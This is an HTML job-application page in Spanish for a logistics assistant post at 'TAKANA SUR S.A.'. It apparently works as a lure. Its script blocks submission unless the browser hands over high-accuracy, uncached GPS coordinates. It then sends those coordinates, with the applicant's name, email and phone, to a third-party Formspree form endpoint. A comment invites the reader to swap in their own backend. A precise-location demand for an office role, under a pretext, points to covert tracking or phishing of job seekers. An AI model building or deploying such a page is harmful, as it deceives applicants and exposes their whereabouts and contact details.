<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Postulación | TAKANA SUR S.A.</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
    <style>
        /* --- General Variables and Reset --- */
        :root {
            --primary-color: #0056b3; /* Darker Blue, representing transport */
            --secondary-color: #007bff; /* Brighter Blue, for action */
            --accent-color: #ffc107; /* Amber, for highlights/warnings */
            --text-color: #343a40; /* Dark grey for body text */
            --heading-color: #212529; /* Even darker for headings */
            --bg-color: #f8f9fa; /* Light background */
            --card-bg: #ffffff; /* White card background */
            --border-color: #dee2e6; /* Light grey border */
            --success-color: #28a745; /* Green for success */
            --error-color: #dc3545; /* Red for errors */
            --shadow-light: rgba(0, 0, 0, 0.05);
            --shadow-medium: rgba(0, 0, 0, 0.1);
        }

        *, *::before, *::after {
            box-sizing: border-box;
        }

        body {
            font-family: 'Lato', sans-serif;
            margin: 0;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.7; /* Slightly more spacious line height */
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* --- Header Styling --- */
        .header {
            background: linear-gradient(90deg, var(--primary-color) 0%, var(--secondary-color) 100%);
            color: white;
            padding: 25px 5%; /* More vertical padding */
            box-shadow: 0 4px 8px var(--shadow-medium);
            text-align: center;
        }

        .header h1 {
            margin: 0;
            font-size: 30px; /* Larger company name */
            font-family: 'Montserrat', sans-serif;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        /* --- Main Container and Sections --- */
        .container {
            max-width: 900px; /* Wider container for more content */
            margin: 40px auto;
            padding: 45px; /* More internal padding */
            background-color: var(--card-bg);
            box-shadow: 0 10px 30px var(--shadow-light); /* More pronounced shadow */
            border-radius: 18px; /* More rounded corners */
            overflow: hidden;
        }

        .job-title {
            color: var(--primary-color);
            font-family: 'Montserrat', sans-serif;
            font-size: 40px; /* Larger job title */
            font-weight: 700;
            margin-bottom: 35px; /* More space below title */
            text-align: center;
            letter-spacing: -1px;
            line-height: 1.2;
        }

        .job-section {
            margin-bottom: 45px; /* More space between sections */
            padding-bottom: 25px;
            border-bottom: 1px solid var(--border-color); /* Solid separator */
        }

        .job-section:last-of-type {
            border-bottom: none;
        }

        .job-section h3 {
            font-family: 'Montserrat', sans-serif;
            font-size: 26px; /* Larger section headings */
            color: var(--heading-color);
            margin-bottom: 22px;
            position: relative;
            padding-left: 20px;
        }

        .job-section h3::before {
            content: '•';
            color: var(--accent-color);
            position: absolute;
            left: 0;
            font-size: 1.3em;
            line-height: 1;
        }

        ul {
            padding-left: 25px;
            list-style: none;
        }

        li {
            margin-bottom: 15px; /* More space between list items */
            line-height: 1.8;
            position: relative;
            padding-left: 30px; /* More space for custom bullet */
        }

        li::before {
            content: '✓';
            color: var(--secondary-color);
            position: absolute;
            left: 0;
            font-weight: bold;
            font-size: 1.1em;
        }

        /* --- Buttons --- */
        .apply-button-container {
            text-align: center;
            margin-top: 55px; /* More margin */
        }

        button {
            font-family: 'Montserrat', sans-serif;
            font-weight: 700;
            padding: 18px 50px; /* Larger padding for buttons */
            border: none;
            border-radius: 35px; /* More rounded pill shape */
            cursor: pointer;
            transition: all 0.35s ease-in-out; /* Slightly slower transition */
            box-shadow: 0 5px 12px var(--shadow-light);
            min-width: 220px; /* Ensure buttons have a minimum width */
            text-transform: uppercase; /* Uppercase text for buttons */
            letter-spacing: 0.8px;
        }

        #postularBtn {
            background-color: var(--accent-color);
            color: var(--heading-color);
            font-size: 22px;
        }

        #postularBtn:hover {
            transform: translateY(-7px) scale(1.03); /* More pronounced hover effect */
            box-shadow: 0 10px 20px var(--shadow-medium);
        }

        #submitFormBtn {
            background-color: var(--secondary-color);
            color: white;
            font-size: 20px;
            margin-top: 25px; /* Spacing from location explanation */
        }

        #submitFormBtn:hover {
            background-color: var(--primary-color);
            transform: translateY(-4px) scale(1.01);
            box-shadow: 0 8px 15px var(--shadow-medium);
        }

        /* --- Registration Form --- */
        #registrationForm {
            display: none;
            border-top: 4px solid var(--accent-color); /* Thicker border */
            padding-top: 40px;
            margin-top: 45px;
            animation: fadeInScale 0.7s ease-out forwards; /* Slightly slower animation */
        }

        #registrationForm h3 {
            font-family: 'Montserrat', sans-serif;
            font-size: 32px; /* Larger form heading */
            color: var(--primary-color);
            text-align: center;
            margin-bottom: 30px;
        }

        #registrationForm p {
            text-align: center;
            margin-bottom: 35px;
            font-size: 18px; /* Larger text */
            color: #555;
        }

        .form-group {
            margin-bottom: 30px; /* More space between form groups */
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 12px; /* More space below label */
            font-weight: 700;
            font-size: 17px;
            color: var(--heading-color);
        }

        .form-group input {
            width: 100%;
            padding: 16px; /* Larger input padding */
            border: 1px solid var(--border-color);
            border-radius: 10px; /* More rounded input fields */
            box-sizing: border-box;
            font-size: 18px; /* Larger input text */
            transition: border-color 0.3s, box-shadow 0.3s;
        }

        .form-group input:focus {
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 5px rgba(0, 123, 255, 0.2); /* More prominent focus ring */
            outline: none;
        }

        /* --- Location Explanation --- */
        .location-explanation {
            background-color: #e6f7ff; /* Lighter blue background */
            padding: 25px; /* More padding */
            border-radius: 12px; /* More rounded corners */
            margin-bottom: 35px; /* More margin below */
            color: #0056b3; /* Darker blue text */
            font-size: 17px;
            border: 1px solid #99daff; /* Lighter blue border */
            box-shadow: 0 3px 10px var(--shadow-light);
            line-height: 1.6;
        }

        .location-explanation strong {
            font-weight: 700;
            color: #003366; /* Even darker blue for emphasis */
        }

        /* --- Status Messages --- */
        #submitStatus {
            margin-top: 30px; /* More margin */
            padding: 12px; /* Larger padding */
            border-radius: 10px; /* More rounded */
            font-size: 17px; /* Larger text */
            font-weight: 700;
            text-align: center;
            min-height: 25px;
        }

        #submitStatus:not(:empty) {
            border: 1px solid;
            box-shadow: 0 2px 5px var(--shadow-light);
        }

        #submitStatus.success {
            color: var(--success-color);
            background-color: #d4edda;
            border-color: #28a745;
        }

        #submitStatus.error {
            color: var(--error-color);
            background-color: #f8d7da;
            border-color: #dc3545;
        }

        /* --- Responsive Adjustments --- */
        @media (max-width: 768px) {
            .header, .container {
                padding: 20px;
                margin: 20px auto;
            }
            .header h1 {
                font-size: 26px;
            }
            .job-title {
                font-size: 32px;
            }
            .job-section h3 {
                font-size: 22px;
            }
            button {
                padding: 16px 35px;
                font-size: 18px;
            }
            #registrationForm h3 {
                font-size: 28px;
            }
            .form-group input {
                font-size: 16px;
            }
            .location-explanation, #registrationForm p, li {
                font-size: 16px;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 15px auto;
            }
            .header h1 {
                font-size: 24px;
            }
            .job-title {
                font-size: 28px;
                margin-bottom: 25px;
            }
            button {
                min-width: unset;
                width: 100%;
                padding: 14px 25px;
                font-size: 17px;
            }
            #postularBtn, #submitFormBtn {
                margin-top: 20px;
            }
            .job-section, .job-section h3, ul, li, .form-group, .location-explanation, #registrationForm p {
                margin-bottom: 25px;
                padding-bottom: 15px;
            }
            #registrationForm h3 {
                font-size: 26px;
            }
        }
    </style>
</head>
<body>

    <header class="header">
        <h1>TAKANA SUR S.A.</h1>
    </header>

    <div class="container">
        <h2 class="job-title">Asistente Administrativo de Operaciones y Logística</h2>

        <div class="job-section">
            <h3>Sobre la Oportunidad</h3>
            <p>En **TAKANA SUR S.A.**, líderes en servicios de transporte y comunicaciones en la región sur, buscamos un Asistente Administrativo de Operaciones y Logística proactivo y con alto nivel de detalle. Esta posición es crucial para optimizar nuestras rutas, gestionar la flota vehicular y asegurar una comunicación fluida en todas nuestras operaciones, contribuyendo directamente a la eficiencia y seguridad de nuestros servicios.</p>
        </div>

        <div class="job-section">
            <h3>Funciones Principales</h3>
            <ul>
                <li>Coordinación y seguimiento de rutas de transporte de carga y pasajeros.</li>
                <li>Gestión de la documentación vehicular y permisos de operación.</li>
                <li>Soporte en la programación y mantenimiento preventivo de la flota.</li>
                <li>Comunicación efectiva con operadores, clientes y proveedores logísticos.</li>
                <li>Manejo de inventario de equipos de comunicación y consumibles de oficina.</li>
                <li>Elaboración de informes de desempeño operativo y logístico.</li>
            </ul>
        </div>

        <div id="registrationForm">
            <h3>Postulación Iniciada</h3>
            <p>Para completar tu postulación en **TAKANA SUR S.A.**, por favor, ingresa tus datos. Nuestro equipo de Recursos Humanos se pondrá en contacto contigo a la brevedad.</p>
            <div class="location-explanation">
                <strong>Importante para tu postulación en TAKANA SUR S.A.:</strong> Para optimizar la asignación a nuestras bases operativas o la planificación de rutas, y asegurar una cobertura eficiente de nuestros servicios de transporte y comunicaciones en la <strong>Región Sur</strong>, requerimos tu ubicación al momento de enviar este formulario. Esto nos permite evaluar tu proximidad a nuestras principales áreas de operación y asignarte a la posición más adecuada geográficamente.
            </div>
            <form id="applicantForm">
                <div class="form-group">
                    <label for="name">Nombre Completo</label>
                    <input type="text" id="name" name="name" placeholder="Ej: Ana Torres" required>
                </div>
                <div class="form-group">
                    <label for="email">Correo Electrónico</label>
                    <input type="email" id="email" name="email" placeholder="Ej: ana.torres@dominio.com" required>
                </div>
                <div class="form-group">
                    <label for="phone">Teléfono de Contacto</label>
                    <input type="tel" id="phone" name="phone" placeholder="Ej: +51 987654321" required>
                </div>
                <div class="apply-button-container">
                    <button type="submit" id="submitFormBtn">Enviar Postulación</button>
                    <p id="submitStatus"></p>
                </div>
            </form>
        </div>

        <div class="apply-button-container" id="applyButtonContainer">
            <button id="postularBtn">Iniciar Postulación</button>
        </div>
    </div>

    <script>
        const postularBtn = document.getElementById('postularBtn');
        const registrationForm = document.getElementById('registrationForm');
        const applyButtonContainer = document.getElementById('applyButtonContainer');
        const applicantForm = document.getElementById('applicantForm');
        const submitFormBtn = document.getElementById('submitFormBtn');
        const submitStatus = document.getElementById('submitStatus');

        postularBtn.addEventListener('click', () => {
            registrationForm.style.display = 'block';
            applyButtonContainer.style.display = 'none';
        });

        applicantForm.addEventListener('submit', function(event) {
            event.preventDefault();
            submitStatus.textContent = "Solicitando permiso de ubicación...";
            submitStatus.className = ''; // Reset error/success classes
            
            // Disable button to prevent multiple submissions
            submitFormBtn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocationAndSubmit, showErrorOnSubmit, {
                    enableHighAccuracy: true,
                    timeout: 10000, // 10 seconds timeout
                    maximumAge: 0 // Don't use cached position
                });
            } else {
                submitStatus.textContent = "Geolocalización no soportada por su navegador. Postulación no enviada.";
                submitStatus.className = 'error';
                alert('Geolocalización no soportada por su navegador. No se pudo enviar la postulación.');
                submitFormBtn.disabled = false; // Re-enable button
            }
        });

        async function sendLocationAndSubmit(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            submitStatus.textContent = "Ubicación obtenida. Enviando postulación...";

            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value;

            // IMPORTANT: Replace with your actual backend URL where you want to send the data
            const backendUrl = 'https://formspree.io/f/meokweak'; 

            try {
                const response = await fetch(backendUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name, email, phone, lat, lon, location_accuracy: position.coords.accuracy }),
                });

                if (response.ok) {
                    submitStatus.textContent = "✅ ¡Gracias! Tu postulación ha sido enviada exitosamente a TAKANA SUR S.A.";
                    submitStatus.className = 'success';
                    alert('✅ ¡Gracias! Tu postulación ha sido enviada exitosamente a TAKANA SUR S.A.');
                    applicantForm.reset();
                    registrationForm.style.display = 'none';
                    applyButtonContainer.style.display = 'block';
                } else {
                    const errorText = await response.text(); 
                    let errorMessage = "Error al enviar la postulación. Por favor, inténtalo de nuevo.";
                    try {
                        const errorData = JSON.parse(errorText);
                        errorMessage = errorData.message || errorMessage;
                    } catch (e) {
                        errorMessage = `Error del servidor: ${errorText.substring(0, Math.min(errorText.length, 100))}...`; 
                    }
                    console.error('Error al enviar la postulación:', errorText);
                    submitStatus.textContent = errorMessage;
                    submitStatus.className = 'error';
                    alert(`Error al enviar la postulación: ${errorMessage}`);
                }
            } catch (error) {
                console.error('Error de red al enviar la postulación:', error);
                submitStatus.textContent = "Error de red al enviar la postulación. Revisa tu conexión.";
                submitStatus.className = 'error';
                alert('Error de red al enviar la postulación. Revisa tu conexión.');
            } finally {
                submitFormBtn.disabled = false; // Always re-enable button
            }
        }

        function showErrorOnSubmit(error) {
            let message = "No se pudo obtener la ubicación para completar la postulación.";
            if (error.code === error.PERMISSION_DENIED) {
                message = "Permiso de ubicación denegado. No podemos procesar la postulación sin su ubicación.";
            } else if (error.code === error.POSITION_UNAVAILABLE) {
                message = "Ubicación no disponible. Inténtelo de nuevo o revise su conexión.";
            } else if (error.code === error.TIMEOUT) {
                message = "Tiempo de espera agotado al intentar obtener su ubicación. Inténtelo de nuevo.";
            }
            submitStatus.textContent = message;
            submitStatus.className = 'error';
            alert(message);
            submitFormBtn.disabled = false; // Re-enable button
        }
    </script>
</body>
</html>